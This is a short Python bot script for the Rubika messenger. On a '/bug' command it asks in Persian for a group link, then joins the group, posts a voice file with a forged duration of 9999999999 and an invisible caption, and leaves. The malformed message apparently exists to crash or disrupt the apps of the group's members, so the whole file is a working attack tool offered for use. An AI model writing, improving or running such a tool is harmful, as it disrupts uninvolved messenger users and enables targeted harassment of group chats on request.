from arsein import *

xco = Robot_Rubika('')

ans = []

while True:
	try:
		for chat in xco.getChatsUpdate():
			if chat['abs_object']['type'] == 'User':
				msg = chat['last_message']
				if msg['message_id'] not in ans:
					ans.append(msg['message_id'])
					print(f'PM : ',msg.get("text"))
					if msg.get('text').startswith('/bug'):
						xco.sendMessage(chat['object_guid'],'لینک گپ مورد نظر را وارد کنید',message_id=msg['message_id'])
					elif msg.get('text').startswith('https'):
						link = msg.get('text')
						guid = xco.joinGroup(link)['data']['group']['group_guid']
						xco.sendVoice(guid,'Milad.ogg',time="9999999999",caption="‌‌")
						xco.leaveGroup(guid)
	except:
		xco.sendMessage(chat['object_guid'],'EROR',message_id=msg['message_id'])
		pass